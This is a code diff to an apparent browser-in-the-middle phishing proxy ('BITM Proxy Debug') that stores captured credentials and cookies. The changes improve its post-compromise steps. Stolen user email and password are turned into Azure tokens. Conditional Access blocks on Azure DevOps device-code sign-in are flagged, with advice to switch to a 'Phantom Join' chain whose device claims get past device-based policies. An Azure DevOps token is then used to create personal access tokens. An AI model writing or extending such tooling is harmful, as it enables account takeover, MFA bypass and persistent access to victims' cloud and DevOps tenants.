@@ -43,7 +43,7 @@ from backend.routes import capture as capture_routes
 credentials_store = JsonStore("credentials")
 cookies_store = JsonStore("cookies")
 
-app = FastAPI(title="BITM Proxy Debug", version="1.40.1")
+app = FastAPI(title="BITM Proxy Debug", version="1.40.2")
 
 app.add_middleware(APIKeyMiddleware)
 app.include_router(browser_routes.router, prefix="/api/browser", tags=["browser"])
@@ -1652,8 +1652,27 @@ async def api_ado_devicecode_poll(body: dict):
     if err in ("authorization_pending", "slow_down"):
         return {"pending": True, "slow_down": err == "slow_down"}
     m = _re.search(r"AADSTS\d+", d.get("error_description", "") or "")
-    return {"error": d.get("error_description") or err or "device code failed",
-            "aadsts_code": m.group(0) if m else "", "terminal": True}
+    code = m.group(0) if m else ""
+    desc = d.get("error_description") or err or "device code failed"
+    # A CA/MFA block here is expected when the tenant governs the Azure DevOps
+    # resource with authentication strength or a compliant/joined-device
+    # requirement: device-code sign-in is interactive but can't satisfy a
+    # phishing-resistant-MFA or managed-device policy, so CA refuses the ADO
+    # token. This is the same coverage boundary the demo rides — device-code
+    # only walks past CA when the *target* resource (DRS) is uncovered; the ADO
+    # resource usually isn't. The Phantom Join chain is the way through: its PRT
+    # carries device claims that satisfy device-based CA.
+    ca_codes = ("AADSTS50076", "AADSTS50079", "AADSTS50158",
+                "AADSTS53003", "AADSTS50131", "AADSTS700082")
+    ca_blocked = code in ca_codes
+    if ca_blocked:
+        desc += ("  —  Azure DevOps is behind Conditional Access that device-code "
+                 "sign-in can't satisfy (auth strength / compliant device). Run "
+                 "Phantom Join instead: its PRT carries device claims that satisfy "
+                 "device-based CA, then paste the ADO-audience token it yields into "
+                 "the “Captured token” method above.")
+    return {"error": desc, "aadsts_code": code, "terminal": True,
+            "ca_blocked": ca_blocked}
 
 
 @app.post("/api/create-ado-pat")
@@ -1874,7 +1893,10 @@ async def api_aaa_login(body: dict):
     user = (body.get("user") or "").strip()
     password = body.get("password") or ""
     tenant_id = (body.get("tenant_id") or "").strip()
-    sp = bool(body.get("service_principal", True))
+    # Default to a USER login (no -ServicePrincipal). Captured creds are user
+    # email/password; -ServicePrincipal is only correct when User is an app
+    # (client) ID + secret. Callers opt in explicitly.
+    sp = bool(body.get("service_principal", False))
     if not site_id:
         return {"ok": False, "error": "site_id is required"}
     return await _aaa.acquire_token_via_az_login(
@@ -7409,8 +7431,12 @@ function renderAaaTokenSnippet(d,siteId){
         :guessPass)
     :'<PASSWORD>';
   const dispTid=tid||'<TENANT_ID>';
-  const cmdShown=`Get-AAATokenFromAzLogin -User "${dispUser}" -Password "${dispPass}" -TenantId "${dispTid}" -ServicePrincipal`;
-  const cmdCopy=`Get-AAATokenFromAzLogin -User "${guessUser||'<USER>'}" -Password "${guessPass||'<PASSWORD>'}" -TenantId "${tid||'<TENANT_ID>'}" -ServicePrincipal`;
+  // Captured creds are USER email/password → plain user login (no
+  // -ServicePrincipal). Only add -ServicePrincipal when User is an app
+  // (client) ID and Password is its secret; the login panel has a toggle for
+  // that case.
+  const cmdShown=`Get-AAATokenFromAzLogin -User "${dispUser}" -Password "${dispPass}" -TenantId "${dispTid}"`;
+  const cmdCopy=`Get-AAATokenFromAzLogin -User "${guessUser||'<USER>'}" -Password "${guessPass||'<PASSWORD>'}" -TenantId "${tid||'<TENANT_ID>'}"`;
   const tidNote=tid?'':'<span style="color:#fbbf24">no <code>default_tenant_id</code> set — Settings → Configuration</span>';
   const userNote=guessUser?'':'<span style="color:#fbbf24">no captured email — placeholder only</span>';
   const passNote=guessPass?'':'<span style="color:#fbbf24">no captured password — placeholder only</span>';
@@ -7456,7 +7482,7 @@ function renderAaaTokenSnippet(d,siteId){
       <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
         <label style="color:#94a3b8;font-size:13px;min-width:64px">Tenant</label>
         <input id="aaa-login-tid-${siteId}" class="cfg-input" style="flex:1;min-width:200px;font-size:13px" value="${esc(tid)}">
-        <label id="aaa-login-sp-wrap-${siteId}" style="color:#94a3b8;font-size:13px;margin-left:6px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="aaa-login-sp-${siteId}" checked> -ServicePrincipal</label>
+        <label id="aaa-login-sp-wrap-${siteId}" style="color:#94a3b8;font-size:13px;margin-left:6px;display:flex;align-items:center;gap:4px" title="Only when User is an app (client) ID and Password is its secret. Leave OFF for captured user email/password — a user login must not pass -ServicePrincipal."><input type="checkbox" id="aaa-login-sp-${siteId}"> -ServicePrincipal (app login)</label>
         <button id="aaa-login-go-${siteId}" class="btn" style="padding:3px 12px;font-size:13px;background:#7f1d1d;border-color:#991b1b;color:#fecaca" onclick="aaaLoginGo('${siteId}')">▶ Run</button>
       </div>
       <div style="color:#78859b;font-size:11px;margin-bottom:6px">
@@ -7580,6 +7606,11 @@ function renderAdoPatPanel(d,siteId){
         <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
           <label style="color:#94a3b8;font-size:13px;min-width:64px">Token</label>
           <input id="adopat-token-${siteId}" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" placeholder="ADO-audience (499b84ac…) access token — from the Token dropdown or a capture">
+        </div>
+        <div style="color:#78859b;font-size:11px;margin:0 0 6px 70px;line-height:1.5">
+          Must carry <code style="color:#fca5a5">aud = 499b84ac-1321-427f-aa17-267ca6975798</code> (Azure DevOps) — a Graph token is rejected here. Get one:
+          <code style="color:#7dd3fc;display:block;margin-top:2px;white-space:pre-wrap;word-break:break-all">az account get-access-token --resource 499b84ac-1321-427f-aa17-267ca6975798 --query accessToken -o tsv</code>
+          <span style="color:#5a6472">…or use the ROPC / Device-code method above, which mint an ADO-audience token for you.</span>
         </div>
       </div>
       <div id="adopat-dc-${siteId}" style="display:none;color:#78859b;font-size:12px;margin-bottom:6px">
